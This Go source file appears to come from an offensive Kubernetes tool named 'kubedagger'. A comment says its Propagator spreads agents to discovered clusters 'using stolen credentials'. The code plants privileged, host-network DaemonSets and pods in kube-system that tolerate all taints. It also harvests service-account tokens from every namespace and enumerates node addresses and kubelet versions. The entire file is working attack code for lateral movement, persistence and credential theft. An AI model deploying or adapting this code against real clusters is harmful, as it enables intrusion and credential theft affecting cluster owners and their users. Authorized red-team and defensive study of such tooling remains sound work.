package multicluster

import (
	"context"
	"fmt"
	"strings"

	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

// DeployOpts configures how the agent is deployed to a target cluster.
type DeployOpts struct {
	Image     string
	Namespace string
	Name      string
	Args      []string
	HostPID   bool
	Privileged bool
}

// Propagator deploys agents to discovered clusters using stolen credentials.
type Propagator struct {
	sourceClient kubernetes.Interface
	agentImage   string
}

// NewPropagator creates a Propagator with the given source client and agent container image.
func NewPropagator(client kubernetes.Interface, agentImage string) *Propagator {
	return &Propagator{
		sourceClient: client,
		agentImage:   agentImage,
	}
}

func (p *Propagator) DeployToCluster(ctx context.Context, target ClusterInfo, opts DeployOpts) error {
	client, err := BuildClientFromCluster(target)
	if err != nil {
		return fmt.Errorf("build client for %s: %w", target.Name, err)
	}

	if opts.Image == "" {
		opts.Image = p.agentImage
	}
	if opts.Namespace == "" {
		opts.Namespace = "kube-system"
	}
	if opts.Name == "" {
		opts.Name = "kubedagger-agent"
	}

	ds := p.buildDaemonSet(opts)

	_, err = client.AppsV1().DaemonSets(opts.Namespace).Create(ctx, ds, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("create daemonset on %s: %w", target.Name, err)
	}

	return nil
}

func (p *Propagator) DeployAsJob(ctx context.Context, target ClusterInfo, opts DeployOpts) error {
	client, err := BuildClientFromCluster(target)
	if err != nil {
		return fmt.Errorf("build client for %s: %w", target.Name, err)
	}

	if opts.Image == "" {
		opts.Image = p.agentImage
	}
	if opts.Namespace == "" {
		opts.Namespace = "kube-system"
	}
	if opts.Name == "" {
		opts.Name = "kubedagger-deploy"
	}

	pod := p.buildPod(opts)

	_, err = client.CoreV1().Pods(opts.Namespace).Create(ctx, pod, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("create pod on %s: %w", target.Name, err)
	}

	return nil
}

func (p *Propagator) ExtractTokens(ctx context.Context, client kubernetes.Interface) ([]string, error) {
	var tokens []string

	namespaces, err := client.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		return nil, fmt.Errorf("list namespaces: %w", err)
	}

	for _, ns := range namespaces.Items {
		secrets, err := client.CoreV1().Secrets(ns.Name).List(ctx, metav1.ListOptions{
			FieldSelector: "type=kubernetes.io/service-account-token",
		})
		if err != nil {
			continue
		}

		for _, secret := range secrets.Items {
			if token, ok := secret.Data["token"]; ok {
				tokens = append(tokens, fmt.Sprintf("%s/%s: %s", ns.Name, secret.Name, string(token[:min(64, len(token))])))
			}
		}
	}

	return tokens, nil
}

func (p *Propagator) EnumerateNodes(ctx context.Context, client kubernetes.Interface) ([]string, error) {
	nodes, err := client.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
	if err != nil {
		return nil, fmt.Errorf("list nodes: %w", err)
	}

	var nodeInfo []string
	for _, node := range nodes.Items {
		var addrs []string
		for _, addr := range node.Status.Addresses {
			addrs = append(addrs, fmt.Sprintf("%s=%s", addr.Type, addr.Address))
		}
		info := fmt.Sprintf("%s [%s] %s/%s",
			node.Name,
			strings.Join(addrs, ","),
			node.Status.NodeInfo.OSImage,
			node.Status.NodeInfo.KubeletVersion,
		)
		nodeInfo = append(nodeInfo, info)
	}

	return nodeInfo, nil
}

func (p *Propagator) buildDaemonSet(opts DeployOpts) *appsv1.DaemonSet {
	privileged := opts.Privileged
	labels := map[string]string{
		"app":                          opts.Name,
		"app.kubernetes.io/managed-by": "kubedagger",
	}

	return &appsv1.DaemonSet{
		ObjectMeta: metav1.ObjectMeta{
			Name:      opts.Name,
			Namespace: opts.Namespace,
			Labels:    labels,
		},
		Spec: appsv1.DaemonSetSpec{
			Selector: &metav1.LabelSelector{MatchLabels: labels},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: labels},
				Spec: corev1.PodSpec{
					HostPID:     opts.HostPID,
					HostNetwork: true,
					Containers: []corev1.Container{{
						Name:    "agent",
						Image:   opts.Image,
						Args:    opts.Args,
						SecurityContext: &corev1.SecurityContext{
							Privileged: &privileged,
						},
					}},
					Tolerations: []corev1.Toleration{{
						Operator: corev1.TolerationOpExists,
					}},
				},
			},
		},
	}
}

func (p *Propagator) buildPod(opts DeployOpts) *corev1.Pod {
	privileged := opts.Privileged
	return &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      opts.Name,
			Namespace: opts.Namespace,
			Labels: map[string]string{
				"app":                          opts.Name,
				"app.kubernetes.io/managed-by": "kubedagger",
			},
		},
		Spec: corev1.PodSpec{
			HostPID:       opts.HostPID,
			HostNetwork:   true,
			RestartPolicy: corev1.RestartPolicyNever,
			Containers: []corev1.Container{{
				Name:  "agent",
				Image: opts.Image,
				Args:  opts.Args,
				SecurityContext: &corev1.SecurityContext{
					Privileged: &privileged,
				},
			}},
			Tolerations: []corev1.Toleration{{
				Operator: corev1.TolerationOpExists,
			}},
		},
	}
}
